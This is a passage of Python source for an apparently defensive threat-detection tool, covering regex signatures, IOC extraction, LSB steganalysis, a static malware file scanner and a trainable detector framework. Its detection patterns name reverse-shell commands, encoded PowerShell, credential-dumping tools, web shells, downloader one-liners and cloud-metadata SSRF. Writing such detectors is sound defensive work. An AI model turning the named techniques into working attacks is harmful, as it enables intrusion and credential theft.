    "Cross-site scripting": (re.compile(r"(?i)(<script[\s>]|javascript:|onerror\s*=|onload\s*=|<svg[^>]+onload|document\.cookie)"), .70, "T1189"),
    "Path traversal": (re.compile(r"(?i)((\.\./){2,}|(\.\.\\){2,}|%2e%2e(%2f|/)|/etc/(passwd|shadow)|boot\.ini|\\windows\\system32)"), .80, "T1083"),
    "Command injection": (re.compile(r"(?i)(;|\|\||&&|`|\$\()\s*(cat|ls|id|whoami|wget|curl|nc|ncat|bash|sh|powershell|cmd)(\s|\)|$)|/bin/(ba)?sh\b"), .80, "T1059"),
    "Log4Shell / JNDI": (re.compile(r"(?i)\$\{(jndi|\$\{|lower|upper|env)[:\w${}\-/.]*(ldap|rmi|dns|ldaps|iiop)?"), .90, "T1190"),
    "Shellshock": (re.compile(r"\(\)\s*\{\s*:;\s*\}\s*;"), .90, "T1190"),
    "Web shell": (re.compile(r"(?i)(eval\(base64_decode|passthru\(|shell_exec\(|c99shell|r57shell|b374k|china chopper|assert\(\$_(post|get|request))"), .92, "T1505.003"),
    "Scanner / attack tool UA": (re.compile(r"(?i)(sqlmap|nikto|nmap scripting|masscan|acunetix|nessus|dirbuster|gobuster|wpscan|hydra|zgrab|nuclei)"), .55, "T1595"),
    "SSRF / cloud metadata": (re.compile(r"169\.254\.169\.254|metadata\.google\.internal"), .80, "T1552.005"),
    "PHP wrapper abuse": (re.compile(r"(?i)php://(input|filter)|data://text/plain;base64|expect://"), .75, "T1190"),
    "Reverse shell": (re.compile(r"(?i)(/dev/tcp/\d|nc(at)?\s+(-\w+\s+)*-e\s|bash\s+-i\s*>&|python\d?\s+-c\s+['\"]import\s+socket|powershell.*-nop.*-w\s+hidden)"), .93, "T1059"),
    "Encoded PowerShell": (re.compile(r"(?i)powershell(\.exe)?\s+.*-(enc|encodedcommand|e)\s+[A-Za-z0-9+/=]{20,}"), .85, "T1059.001"),
    "Credential dumping": (re.compile(r"(?i)(mimikatz|sekurlsa::|lsass\.exe.*(dump|minidump)|procdump.*lsass|ntds\.dit|reg\s+save\s+hklm\\sam)"), .92, "T1003"),
}

IOC_RES = {
    "ipv4": re.compile(r"(?<![\d.])(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])"),
    "url": re.compile(r"(?i)\bhxxps?://[^\s<>\"'\\^`{|}]+|\bhttps?://[^\s<>\"'\\^`{|}]+|\bftp://[^\s<>\"']+"),
    "domain": re.compile(r"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\[?\.\]?))+(?:com|net|org|io|info|biz|xyz|top|tk|ml|ga|cf|gq|ru|cn|su|cc|co|me|us|uk|de|fr|nl|br|in|ir|kp|rw|site|online|club|click|link|work|live|shop|app|dev|cloud|zip|mov)\b"),
    "email": re.compile(r"(?i)\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}\b"),
    "sha256": re.compile(r"(?i)\b[a-f0-9]{64}\b"),
    "sha1": re.compile(r"(?i)\b[a-f0-9]{40}\b"),
    "md5": re.compile(r"(?i)\b[a-f0-9]{32}\b"),
    "cve": re.compile(r"(?i)\bCVE-\d{4}-\d{4,7}\b"),
    "btc": re.compile(r"\b(?:bc1[a-z0-9]{25,60}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b"),
}

SUSP_TLDS = {"tk", "ml", "ga", "cf", "gq", "xyz", "top", "click", "link", "work", "zip", "mov", "icu", "cn", "ru",
             "su", "cc", "buzz", "monster", "rest", "country", "kim", "loan", "men", "party", "review", "stream"}
SHORTENERS = {"bit.ly", "tinyurl.com", "t.co", "goo.gl", "ow.ly", "is.gd", "buff.ly", "rebrand.ly", "cutt.ly",
              "shorturl.at", "tiny.cc", "rb.gy"}
BRANDS = ("paypal", "apple", "microsoft", "office365", "outlook", "google", "gmail", "amazon", "netflix", "facebook",
          "instagram", "whatsapp", "dhl", "fedex", "ups", "usps", "bank", "chase", "wellsfargo", "citibank", "hsbc",
          "binance", "coinbase", "metamask", "linkedin", "dropbox", "docusign", "adobe", "mtn", "airtel", "equity")

ALIASES = {
    "ts": ("ts", "timestamp", "time", "datetime", "date", "event_time", "@timestamp", "logged_at", "created_at", "when", "start_time", "starttime"),
    "user": ("user", "username", "user_name", "account", "user_id", "userid", "uid", "actor", "principal", "src_user", "subject_user", "login", "customer", "customer_id", "account_id", "nameorig"),
    "src_ip": ("src_ip", "source_ip", "srcip", "src", "ip", "client_ip", "remote_addr", "remote_ip", "source_address", "id_orig_h", "ipaddress", "ip_address", "source"),
    "dst_ip": ("dst_ip", "dest_ip", "destination_ip", "dstip", "dst", "dest", "server_ip", "id_resp_h", "destination", "destination_address"),
    "src_port": ("src_port", "sport", "source_port", "id_orig_p"),
    "dst_port": ("dst_port", "dport", "dest_port", "destination_port", "port", "id_resp_p"),
    "proto": ("proto", "protocol", "protocol_type", "ip_protocol"),
    "action": ("action", "event", "event_type", "event_name", "activity", "operation", "event_action", "type", "eventid", "event_id"),
    "success": ("success", "outcome", "result", "status", "event_outcome", "login_result", "authentication_result", "auth_result"),
    "bytes": ("bytes", "total_bytes", "size", "length", "bytes_total", "data_size", "file_size"),
    "bytes_out": ("bytes_out", "src_bytes", "orig_bytes", "sent_bytes", "out_bytes", "bytes_sent", "upload_bytes"),
    "bytes_in": ("bytes_in", "dst_bytes", "resp_bytes", "recv_bytes", "in_bytes", "bytes_received", "download_bytes"),
    "country": ("country", "geo_country", "country_code", "src_country", "geoip_country", "location", "geo"),
    "lat": ("lat", "latitude", "geo_lat", "src_lat"),
    "lon": ("lon", "lng", "longitude", "geo_lon", "src_lon"),
    "host": ("host", "hostname", "device", "computer", "computername", "machine", "asset", "workstation", "device_name"),
    "resource": ("resource", "object", "target", "file", "path", "url", "uri", "request", "file_path", "app", "application", "service"),
    "msg": ("msg", "message", "line", "log", "text", "description", "raw", "payload", "event_message", "body", "details"),
    "ua": ("ua", "user_agent", "useragent", "agent"),
    "device": ("device_id", "deviceid", "device_fingerprint", "fingerprint"),
    "amount": ("amount", "amt", "transaction_amount", "value", "transactionamt", "total", "tx_amount"),
    "merchant": ("merchant", "merchant_id", "merchant_name", "vendor", "namedest", "payee", "store"),
    "mfa": ("mfa", "mfa_result", "mfa_status", "second_factor"),
    "role": ("role", "privilege", "group", "permission", "access_level"),
    "dns": ("dns_query", "query", "qname", "domain", "dns", "hostname_queried"),
    "dur": ("duration", "dur", "flow_duration", "elapsed"),
}
_FAIL_TOK = ("fail", "denied", "deny", "invalid", "reject", "block", "error", "wrong", "bad", "unauthor", "locked", "401", "403", "refused", "false", "0")
_OK_TOK = ("success", "ok", "accept", "allow", "pass", "granted", "true", "1", "200", "logged in", "permit")


def to_success(v):
    if v is None or v == "":
        return None
    if isinstance(v, bool):
        return v
    s = str(v).strip().lower()
    if any(t == s for t in ("1", "0", "true", "false", "200", "401", "403")):
        return s in ("1", "true", "200")
    if any(t in s for t in _FAIL_TOK[:-1]):
        return False
    if any(t in s for t in _OK_TOK):
        return True
    return None


def norm_event(r: dict) -> dict:
    """Map arbitrary column names onto the canonical event schema (keeps the original under 'raw')."""
    ev: dict = {"raw": r}
    low = {k.lower(): v for k, v in r.items()}
    for canon_k, names in ALIASES.items():
        for n in names:
            if n in low and low[n] not in (None, ""):
                ev[canon_k] = low[n]
                break
    if "ts" in ev:
        ev["ts"] = parse_ts(ev["ts"])
    for k in ("bytes", "bytes_in", "bytes_out", "amount", "lat", "lon", "dur"):
        if k in ev:
            ev[k] = fnum(ev[k])
    for k in ("src_port", "dst_port"):
        if k in ev:
            x = fnum(ev[k])
            ev[k] = int(x) if x is not None else None
    if "success" in ev:
        ev["success"] = to_success(ev["success"])
    for k in ("user", "src_ip", "dst_ip", "action", "host", "country", "resource", "msg", "proto"):
        if k in ev and ev[k] is not None:
            ev[k] = str(ev[k])
    return ev


def extract_iocs(text: str) -> dict:
    out: dict = {}
    t = text.replace("[.]", ".").replace("(.)", ".").replace("hxxp", "http")
    for k, rx in IOC_RES.items():
        found = set(rx.findall(t))
        if k == "ipv4":
            found = {ip for ip in found if is_ip(ip) and not is_private_ip(ip) and not ip.startswith(("0.", "255.", "127."))}
        elif k == "domain":
            found = {d.lower() for d in found if not d.lower().endswith((".png", ".jpg", ".exe", ".dll", ".py", ".txt", ".js"))}
        if found:
            out[k] = sorted(found)[:500]
    return out


# ═══════════════════════════════════════════════════════════════════════
#  CHI-SQUARE (for steganalysis)  – regularised incomplete gamma
# ═══════════════════════════════════════════════════════════════════════
def _gammaincc(a: float, x: float) -> float:
    if x <= 0:
        return 1.0
    if x < a + 1:
        ap, s = a, 1.0 / a
        d = s
        for _ in range(600):
            ap += 1
            d *= x / ap
            s += d
            if abs(d) < abs(s) * 1e-13:
                break
        return max(0.0, 1.0 - s * math.exp(-x + a * math.log(x) - math.lgamma(a)))
    b = x + 1 - a
    c, d = 1e300, 1 / b
    h = d
    for i in range(1, 600):
        an = -i * (i - a)
        b += 2
        d = an * d + b
        d = 1e-300 if abs(d) < 1e-300 else d
        c = b + an / c
        c = 1e-300 if abs(c) < 1e-300 else c
        d = 1 / d
        de = d * c
        h *= de
        if abs(de - 1) < 1e-13:
            break
    return min(1.0, math.exp(-x + a * math.log(x) - math.lgamma(a)) * h)


def chi2_sf(x: float, k: int) -> float:
    return _gammaincc(k / 2.0, x / 2.0) if k > 0 else 1.0


def pov_chi_p(hist: np.ndarray) -> float:
    """Westfeld–Pfitzmann pairs-of-values test.  p→1 means the LSB pairs are equalised (embedding)."""
    h = hist.astype(float).reshape(128, 2)
    tot = h.sum(1)
    exp = tot / 2
    m = exp > 4
    if m.sum() < 8:
        return 0.0
    chi = float((((h[m, 0] - exp[m]) ** 2) / exp[m]).sum())
    return chi2_sf(chi, int(m.sum()) - 1)


STEG_WIN = 16384
STEG_P = 0.02
STEG_MIN_RUN = 6        # ≈12 KB: shorter equalised prefixes also occur by chance in flat image regions


def steg_scan_bytes(flat: np.ndarray, cs_probe: bool = True) -> dict:
    """Windowed LSB steganalysis (Westfeld–Pfitzmann pairs-of-values test, 16K-sample windows).

    Sequential LSB embedding makes a PREFIX of the sample stream look 'equalised' (p not tiny) while the untouched rest keeps the
    natural, irregular histogram (p≈0).  We report the length of that equalised prefix.  If the tail is equalised too the image is
    simply noisy and the test is INCONCLUSIVE.  Payloads below ~12 KB are below this test's resolution."""
    flat = flat[:16 << 20]
    n = flat.size
    res = {"samples": int(n), "cryptosec_header": False, "p_max": 0.0, "est_payload_bytes": 0, "lsb_ones": None,
           "run_windows": 0, "inconclusive": False, "tail_p": None, "window": STEG_WIN}
    if n < 4096:
        return res
    if cs_probe:
        res["cryptosec_header"] = bytes(np.packbits((flat[:32] & 1).astype(np.uint8)).tobytes()) == b"CSEC"
    W = STEG_WIN if n >= 8 * STEG_WIN else max(2048, n // 8)
    nw = n // W
    ps = [pov_chi_p(np.bincount(flat[i * W:(i + 1) * W], minlength=256)) for i in range(min(nw, 400))]
    if nw > 400:
        ps += [pov_chi_p(np.bincount(flat[i * W:(i + 1) * W], minlength=256)) for i in range(nw - 4, nw)]
    run = 0
    while run < len(ps) and ps[run] > STEG_P:
        run += 1
    tail = ps[-4:]
    res["tail_p"] = round(float(np.mean(tail)), 4)
    tail_eq = sum(p > STEG_P for p in tail) / len(tail)
    res["lsb_ones"] = round(float((flat[:min(n, 1 << 20)] & 1).mean()), 4)
    res["series"] = [round(p, 3) for p in ps[:12]]
    if run and run >= len(ps) - 1 or (run and tail_eq > 0.5):
        res["inconclusive"] = True                  # everything looks equalised → noisy cover, cannot tell
    elif run >= STEG_MIN_RUN:
        res.update(run_windows=run, p_max=round(float(min(ps[:run])), 4), est_payload_bytes=run * W // 8)
    return res


# ═══════════════════════════════════════════════════════════════════════
#  FILE SCANNER  (malware heuristics + steganalysis + polyglot checks)
# ═══════════════════════════════════════════════════════════════════════
MAGICS = ((b"MZ", "pe"), (b"\x7fELF", "elf"), (b"\xcf\xfa\xed\xfe", "macho"), (b"\xca\xfe\xba\xbe", "macho"),
          (b"%PDF", "pdf"), (b"PK\x03\x04", "zip"), (b"\x89PNG\r\n\x1a\n", "png"), (b"\xff\xd8\xff", "jpeg"),
          (b"GIF8", "gif"), (b"BM", "bmp"), (b"\xd0\xcf\x11\xe0", "ole"), (b"{\\rtf", "rtf"), (b"7z\xbc\xaf", "7z"),
          (b"Rar!", "rar"), (b"\x1a\x45\xdf\xa3", "mkv"), (b"RIFF", "riff"), (b"\x1f\x8b", "gzip"), (b"#!", "script"))
EXT_KIND = {".png": "png", ".jpg": "jpeg", ".jpeg": "jpeg", ".gif": "gif", ".bmp": "bmp", ".pdf": "pdf",
            ".mp4": "video", ".mkv": "mkv", ".avi": "riff", ".mov": "video", ".webm": "mkv", ".docx": "zip",
            ".xlsx": "zip", ".pptx": "zip", ".txt": "text", ".csv": "text", ".doc": "ole", ".xls": "ole",
            ".exe": "pe", ".dll": "pe", ".sys": "pe", ".scr": "pe", ".ps1": "script", ".js": "script",
            ".vbs": "script", ".bat": "script", ".sh": "script", ".py": "script"}
MEDIA_DOC = {"png", "jpeg", "gif", "bmp", "pdf", "video", "mkv", "riff", "text"}
API_GROUPS = {
    "injection": (b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread", b"NtUnmapViewOfSection", b"QueueUserAPC", b"SetThreadContext"),
    "download/exec": (b"URLDownloadToFile", b"WinExec", b"ShellExecute", b"InternetOpenUrl", b"WinHttpOpen", b"CreateProcess"),
    "evasion": (b"IsDebuggerPresent", b"CheckRemoteDebuggerPresent", b"NtQueryInformationProcess", b"GetTickCount", b"OutputDebugString"),
    "persistence": (b"RegSetValueEx", b"RegCreateKey", b"CurrentVersion\\Run", b"schtasks", b"CreateService"),
    "crypto/ransom": (b"CryptEncrypt", b"CryptGenKey", b"BCryptEncrypt", b".locked", b".encrypted", b"vssadmin delete shadows", b"bcdedit /set"),
    "keylog/spy": (b"SetWindowsHookEx", b"GetAsyncKeyState", b"GetClipboardData", b"BitBlt", b"capGetDriverDescription"),
}
SCRIPT_MARKERS = (
    (re.compile(rb"(?i)powershell[^\n]{0,80}-(enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}"), "encoded PowerShell", .85),
    (re.compile(rb"(?i)(Invoke-Expression|\bIEX\b)[^\n]{0,80}(DownloadString|FromBase64String|WebClient)"), "PowerShell download-and-execute", .85),
    (re.compile(rb"(?i)certutil[^\n]{0,40}-urlcache|mshta\s+(http|vbscript)|regsvr32[^\n]{0,30}/i:http|bitsadmin[^\n]{0,30}/transfer"), "living-off-the-land downloader", .80),
    (re.compile(rb"(?i)eval\s*\(\s*(unescape|atob|String\.fromCharCode)|document\.write\s*\(\s*unescape"), "obfuscated JavaScript", .70),
    (re.compile(rb"(?i)(wscript\.shell|scripting\.filesystemobject)[^\n]{0,100}(run|exec|savetofile)"), "VBScript dropper", .75),
    (re.compile(rb"(?i)(your files (have been|are) encrypted|decrypt your files|pay[^\n]{0,30}(bitcoin|btc|monero))"), "ransom note text", .88),
    (re.compile(rb"(?i)(mimikatz|sekurlsa::|gentilkiwi)"), "credential-theft tool strings", .92),
    (re.compile(rb"(?i)/bin/(ba)?sh\s+-i|/dev/tcp/\d+\.\d+\.\d+\.\d+/\d+|nc(at)?\s+-e\s"), "reverse-shell command", .90),
    (re.compile(rb"EICAR-STANDARD-ANTIVIRUS-TEST-FILE"), "EICAR antivirus test string", .95),
    (re.compile(rb"(?i)<\?php[^\n]{0,200}(eval|assert|system|passthru|shell_exec)\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)"), "PHP web shell", .93),
)
FEATURE_NAMES = ("size", "entropy", "max_block_entropy", "is_pe", "is_elf", "is_script", "n_sections", "rwx_sections",
                 "high_entropy_sections", "susp_api_groups", "susp_api_hits", "script_markers", "appended_bytes",
                 "embedded_exec", "ext_mismatch", "printable_ratio", "url_count", "ip_count")


def _pe_info(b: bytes) -> dict:
    info = {"sections": 0, "rwx": 0, "hi_ent": 0, "names": []}
    try:
        off = struct.unpack_from("<I", b, 0x3C)[0]
        if b[off:off + 4] != b"PE\0\0":
            return info
        ns = struct.unpack_from("<H", b, off + 6)[0]
        opt = struct.unpack_from("<H", b, off + 20)[0]
        sec = off + 24 + opt
        for i in range(min(ns, 40)):
            o = sec + i * 40
            name = b[o:o + 8].rstrip(b"\0").decode("latin-1", "replace")
            rsz, rptr, ch = struct.unpack_from("<I", b, o + 16)[0], struct.unpack_from("<I", b, o + 20)[0], struct.unpack_from("<I", b, o + 36)[0]
            info["sections"] += 1
            info["names"].append(name)
            if (ch & 0x20000000) and (ch & 0x80000000) and (ch & 0x40000000):
                info["rwx"] += 1
            if rsz > 1024 and shannon(b[rptr:rptr + min(rsz, 1 << 20)]) > 7.2:
                info["hi_ent"] += 1
    except (struct.error, IndexError):
        pass
    return info


def _appended_after_eof(b: bytes, kind: str) -> int:
    try:
        if kind == "png":
            i = b.rfind(b"IEND")
            return max(0, len(b) - (i + 8)) if i != -1 else 0
        if kind == "jpeg":
            i = b.rfind(b"\xff\xd9")
            return max(0, len(b) - (i + 2)) if i != -1 else 0
        if kind == "gif":
            i = b.rfind(b";")
            return max(0, len(b) - (i + 1)) if i != -1 and b.count(b";") else 0
        if kind == "video":
            pos, n = 0, len(b)
            while pos + 8 <= n:
                sz = struct.unpack_from(">I", b, pos)[0]
                if sz == 1 and pos + 16 <= n:
                    sz = struct.unpack_from(">Q", b, pos + 8)[0]
                if sz < 8:
                    return n - pos
                pos += sz
            return max(0, n - pos) if pos > n else 0
    except struct.error:
        return 0
    return 0


def file_features_and_findings(path: str, ioc_hashes: set | None = None, cs_probe=None) -> dict:
    """Deep static scan. Returns dict(features, reasons, weights, mitre, kind, sha256, steg)."""
    size = os.path.getsize(path)
    sha = hashlib.sha256()
    with open(path, "rb") as f:
        head = f.read(8 << 20)
        sha.update(head)
        rest_tail = b""
        while chunk := f.read(8 << 20):
            sha.update(chunk)
            rest_tail = chunk[-(1 << 20):]
    data = head + (rest_tail if size > len(head) else b"")
    fhex = sha.hexdigest()
    ext = os.path.splitext(path.lower())[1]
    kind = next((k for m, k in MAGICS if head.startswith(m)), None)
    if kind == "riff" and head[8:12] in (b"AVI ", b"WAVE"):
        kind = "riff"
    if head[4:8] == b"ftyp":
        kind = "video"
    if kind is None:
        kind = "text" if shannon(head[:4096]) < 6 and all(c < 128 for c in head[:512]) else "binary"
    declared = EXT_KIND.get(ext)
    reasons, weights, mitre = [], [], []

    def add(w, why, m=None):
        weights.append(w)
        reasons.append(why)
        if m and m not in mitre:
            mitre.append(m)

    ent = shannon(head[:1 << 20])
    blocks = [shannon(head[i:i + 4096]) for i in range(0, min(len(head), 8 << 20), 65536)]
    maxb = max(blocks) if blocks else 0.0
    feats = dict.fromkeys(FEATURE_NAMES, 0)
    feats.update(size=size, entropy=round(ent, 3), max_block_entropy=round(maxb, 3),
                 is_pe=int(kind == "pe"), is_elf=int(kind == "elf"), is_script=int(kind == "script"))
    sample = head[:4096]
    feats["printable_ratio"] = round(sum(32 <= c < 127 or c in (9, 10, 13) for c in sample) / max(1, len(sample)), 3)
    text_probe = data[:2 << 20]
    feats["url_count"] = len(re.findall(rb"(?i)https?://", text_probe))
    feats["ip_count"] = len(re.findall(rb"\b\d{1,3}(?:\.\d{1,3}){3}\b", text_probe))

    # 1. known-bad hash
    if ioc_hashes and fhex in ioc_hashes:
        add(.98, "SHA-256 matches a known-malicious hash in your threat-intel / uploaded datasets")
    # 2. disguised executable
    if declared in MEDIA_DOC and kind in ("pe", "elf", "macho"):
        feats["ext_mismatch"] = 1
        add(.92, f"File claims to be {ext} but is really a {kind.upper()} executable (disguised executable)", "T1036.008")
    elif declared and kind not in ("binary", "text", "riff", declared) and not (declared == "video" and kind in ("video", "riff", "mkv")) \
            and not (declared == "script" and kind in ("text", "script")) and not (declared == "zip" and kind == "zip") \
            and not (declared == "mkv" and kind == "mkv") and kind != "script":
        feats["ext_mismatch"] = 1
        add(.45, f"File extension {ext} does not match its content ({kind})")
    # 3. executables
    if kind == "pe":
        pe = _pe_info(head)
        feats.update(n_sections=pe["sections"], rwx_sections=pe["rwx"], high_entropy_sections=pe["hi_ent"])
        if pe["rwx"]:
            add(.45, f"{pe['rwx']} section(s) are readable+writable+executable (typical of packers/loaders)", "T1027.002")
        if pe["hi_ent"] or ent > 7.2:
            add(.5, f"Packed / encrypted code (entropy {ent:.2f}/8)", "T1027.002")
        odd = [n for n in pe["names"] if re.match(r"^(UPX\d|\.?(aspack|themida|vmp\d|petite|mpress))", n, re.I)]
        if odd:
            add(.5, f"Known packer section names: {', '.join(odd)}", "T1027.002")
    low = data[:4 << 20]
    groups = []
    for g, names in API_GROUPS.items():
        hits = [n for n in names if n in low]
        if hits:
            groups.append(g)
            feats["susp_api_hits"] += len(hits)
    feats["susp_api_groups"] = len(groups)
    if kind in ("pe", "elf", "binary", "macho") and len(groups) >= 2:
        add(min(.85, .3 + .15 * len(groups)), f"Suspicious capability combination: {', '.join(groups)}", "T1055")
    # 4. scripts / text markers (any file type: also catches payloads smuggled inside documents)
    n_markers = 0
    for rx, label, w in SCRIPT_MARKERS:
        if rx.search(low):
            n_markers += 1
            add(w, f"Contains {label}", "T1059" if "shell" in label or "PowerShell" in label else None)
    feats["script_markers"] = n_markers
    # 5. appended / embedded payloads
    app = _appended_after_eof(data if size <= len(data) else head, kind) if kind in ("png", "jpeg", "gif", "video") else 0
    feats["appended_bytes"] = app
    if app > 64 and size <= (len(head) + len(rest_tail)):
        tail = data[-app:]
        if b"MZ" in tail[:4096] or tail.startswith((b"PK\x03\x04", b"\x7fELF")):
            feats["embedded_exec"] = 1
            add(.88, f"{human(app)} of executable/archive data appended after the end of the {kind.upper()} (polyglot)", "T1027.009")
        elif app > 1024:
            add(.40, f"{human(app)} of unexplained data appended after the end of the {kind.upper()} (possible hidden payload)", "T1027.003")
    if kind in ("png", "jpeg", "gif", "bmp", "video", "pdf", "mkv") and not feats["embedded_exec"]:
        i = low.find(b"This program cannot be run in DOS mode")
        if i > 64:
            feats["embedded_exec"] = 1
            add(.85, "A Windows executable is embedded inside this file", "T1027.009")
    # 6. steganalysis
    steg = None
    if kind in ("png", "bmp", "jpeg", "gif") or declared in ("png", "bmp", "jpeg", "gif"):
        steg = steg_image(path)
    elif kind in ("video", "mkv", "riff"):
        steg = steg_video(path)
    if steg and "error" not in steg:
        if steg.get("cryptosec_header"):
            reasons.append("Contains a CryptoSec hidden message (LSB header found) — informational")
        elif steg["run_windows"] >= 1 and not steg.get("inconclusive"):
            add(.5, f"LSB steganalysis: the first ≈{human(steg['est_payload_bytes'])} of pixel data have equalised LSB pairs while the rest "
                    "does not — consistent with a hidden payload", "T1027.003")
    return {"sha256": fhex, "size": size, "kind": kind, "features": feats, "reasons": reasons, "weights": weights,
            "mitre": mitre, "steg": steg, "entropy": ent}


def human(n) -> str:
    n = float(n)
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024 or u == "GB":
            return f"{n:.0f} {u}" if u == "B" else f"{n:.1f} {u}"
        n /= 1024
    return str(n)


def steg_image(path: str) -> dict:
    try:
        from PIL import Image
        with Image.open(path) as im:
            arr = np.asarray(im.convert("RGB"), dtype=np.uint8)
        r = steg_scan_bytes(arr.reshape(-1))
        r["media"] = "image"
        return r
    except Exception as e:                      # pillow missing / not an image
        return {"error": str(e)[:120]}


def steg_video(path: str, frames: int = 4) -> dict:
    try:
        import cv2
        cap = cv2.VideoCapture(path)
        n = int(cap.get(cv2.CAP_PROP_FRAME_COUNT) or 0)
        if n <= 0:
            return {"error": "no frames"}
        best = {"p_max": 0.0, "est_payload_bytes": 0, "cryptosec_header": False, "samples": 0, "media": "video", "run_windows": 0, "inconclusive": False}
        for fi in sorted({0, *(int(n * k / frames) for k in range(1, frames))}):
            cap.set(cv2.CAP_PROP_POS_FRAMES, fi)
            ok, fr = cap.read()
            if ok:
                r = steg_scan_bytes(fr.reshape(-1), cs_probe=(fi == 0))
                best["cryptosec_header"] |= r["cryptosec_header"]
                if r["run_windows"] >= best["run_windows"]:
                    best.update(p_max=r["p_max"], est_payload_bytes=r["est_payload_bytes"], samples=r["samples"],
                                run_windows=r["run_windows"], inconclusive=r.get("inconclusive", False), tail_p=r.get("tail_p"))
        cap.release()
        return best
    except Exception as e:
        return {"error": str(e)[:120]}


# ═══════════════════════════════════════════════════════════════════════
#  DETECTOR FRAMEWORK
# ═══════════════════════════════════════════════════════════════════════
class Detector:
    key = ""
    title = ""
    blurb = ""
    mitre: list = []
    mode = "table"                 # text | table | events | file | series | special
    input_help = "Paste text, a URL or a JSON record."
    columns_help = ""
    text_key = "text"
    trainable = True
    train_label = "🧠 Train on dataset"

    def __init__(self, hub):
        self.hub = hub
        self.model: LearnedModel | None = None
        self.trained_on: dict | None = None
        self.load_model()

    # -- hooks ----------------------------------------------------------
    def extra(self, row: dict) -> dict:
        return {}

    def rules(self, row: dict) -> tuple[float, list, dict]:
        return 0.0, [], {}

    def row_from(self, item) -> dict:
        if isinstance(item, dict):
            return {nk(k): v for k, v in item.items()}
        return {self.text_key: str(item)}

    def subject_of(self, row: dict) -> str:
        v = row.get(self.text_key) or next((str(x) for x in row.values() if isinstance(x, str) and x), "")
        return v[:200] or dumps(row)[:200]

    # -- persistence ----------------------------------------------------
    def _mpath(self):
        return os.path.join(self.hub.model_dir, f"{self.key}.json")

    def _model_blob(self):
        p = self._mpath()
        try:
            if os.path.exists(p):
                with open(p, encoding="utf-8") as f:
                    return json.load(f)
            pg = getattr(self.hub, "pg", None)
            if pg is not None:
                raw = pg.get_model(self.key)
                if raw:
                    return json.loads(raw)
        except Exception:
            pass
        return None

    def load_model(self):
        d = self._model_blob()
        if d:
            try:
                self.model = LearnedModel.from_dict(d["model"], self.extra if self.use_extra else None)
                self.trained_on = d.get("trained_on")
            except Exception:
                self.model = None

    use_extra = True

    def save_model(self):
        d = {"model": self.model.to_dict(), "trained_on": self.trained_on}
        raw = dumps(d)
        tmp = self._mpath() + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            f.write(raw)
        os.replace(tmp, self._mpath())
        sha = sha256s(raw)
        if getattr(self.hub, "pg", None) is not None:
            self.hub.pg.put_model(self.key, self.trained_on, raw, sha)
        return sha

    def forget_model(self):
        self.model, self.trained_on = None, None
        try:
            os.remove(self._mpath())
        except OSError:
            pass

    # -- training -------------------------------------------------------
    def train(self, table: Table, label: str | None = None, contamination: float = 0.02) -> dict:
        if len(table) < 10:
            raise ValueError("Need at least 10 rows to train.")
        lc = None if (label or "").lower() == "none" else detect_label(table.rows, label)
        m = LearnedModel(self.extra if self.use_extra else None)
        metrics = m.fit_supervised(table.rows, lc) if lc else m.fit_anomaly(table.rows, contamination)
        self.model = m
        self.trained_on = {"dataset": table.name, "sha256": table.sha, "rows": len(table), "ts": now(),
                           "label": lc, "kind": m.kind}
        msha = self.save_model()
        self.trained_on["model_sha256"] = msha
        self.hub.on_trained(self, self.trained_on, metrics)
        return {"module": self.key, "kind": m.kind, "label_column": lc, "metrics": metrics,
                "classes": m.classes, "model_sha256": msha}

    # -- inference ------------------------------------------------------
    def combine(self, rs: float, ml: dict | None) -> float:
        if not ml:
            return rs
        if self.model.kind == "supervised":
            s = 0.65 * ml["score"] + 0.35 * rs
            return max(s, 0.95 * rs) if rs >= 0.85 else s
        return noisy_or([rs, 0.85 * ml["score"] if ml["score"] >= 0.5 else 0.0])

    def analyze(self, item, **kw) -> dict:
        row = self.row_from(item)
        rs, reasons, ev = self.rules(row)
        ml = self.model.score_row(row) if self.model else None
        score = self.combine(rs, ml)
        reasons = list(reasons)
        if ml:
            if self.model.kind == "supervised":
                reasons.append(f"Learned model ({self.trained_on['dataset']}): {ml['label']} "
                               f"({ml['score'] * 100:.0f}% risk)")
                tk = self.model.explain_tokens(row)
                if tk:
                    reasons.append("Risky terms: " + ", ".join(tk))
            elif ml["score"] >= 0.5:
                tf = ", ".join(f"{n} (z={z})" for n, z in ml.get("top_features", []))
                reasons.append("Statistical outlier vs. your dataset" + (f": {tf}" if tf else ""))
            ev = {**ev, "ml": {k: v for k, v in ml.items() if k != "top_features"}}
        elif not self.model and self.trainable:
            ev = {**ev, "mode": "rules-only (upload a dataset and train to add a learned model)"}
        f = make_finding(self.key, self.subject_of(row), score * 100, reasons or ["No indicators found"], ev,
                         self.mitre, ts=kw.get("ts"))
        return f

    def analyze_table(self, table: Table, limit: int = 50000, threshold: int = 50) -> dict:
        rows = table.rows[:limit]
        rule_res = [self.rules(self.row_from(r)) for r in rows]
        ml = self.model.score_rows(rows) if self.model else [None] * len(rows)
        findings, scores = [], []
        for r, (rs, reasons, ev), m in zip(rows, rule_res, ml):
            sc = self.combine(rs, m) * 100
            scores.append(sc)
            if sc >= threshold:
                rr = list(reasons)
                if m:
                    rr.append(f"Learned model: {m['label']} ({m['score'] * 100:.0f}%)")
                findings.append(make_finding(self.key, self.subject_of(self.row_from(r)), sc, rr or ["Model flagged"],
                                             ev, self.mitre))
        findings.sort(key=lambda f: -f["score"])
        out = self.table_summary(table, rows, scores, findings)
        return out

    def table_summary(self, table, rows, scores, findings) -> dict:
        sev = collections.Counter(f["severity"] for f in findings)
        out = {"module": self.key, "dataset": table.name, "rows": len(rows), "flagged": len(findings),
               "flag_rate": round(len(findings) / max(1, len(rows)), 4), "by_severity": dict(sev),
               "mode": ("learned+rules" if self.model else "rules-only"), "findings": findings[:200]}
        lc = detect_label(rows)
        if lc and rows and scores:
            labs = norm_labels([r.get(lc, "") for r in rows])
            if set(labs) <= {"benign", "malicious"} and "malicious" in labs:
                y = np.array([l == "malicious" for l in labs])
                p = np.array(scores) >= 50
